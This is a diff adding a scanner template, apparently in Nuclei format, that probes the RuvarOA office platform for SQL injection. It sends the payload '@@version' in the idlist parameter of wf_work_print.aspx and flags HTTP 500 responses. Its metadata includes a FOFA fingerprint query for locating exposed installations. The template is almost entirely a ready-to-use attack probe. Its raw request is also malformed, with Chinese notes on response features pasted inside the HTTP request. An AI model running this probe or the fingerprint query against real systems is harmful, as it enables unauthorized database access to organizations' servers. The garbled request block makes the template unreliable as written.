@@ -1,0 +1,37 @@
+id: poc-gglk83cs9hlm704m
+info:
+  name: RuvarOA协同办公平台-wf_work_print-SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gglk83cs9hlm704m'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gglk83cs9hlm704m
+    fofa: body="txt_admin_key"
+http:
+- raw:
+  - 'GET /WorkFlow/wf_work_print.aspx?idlist=@@version HTTP/1.1
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    500
+
+
+    # 响应内容特征
+
+    nvarchar
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
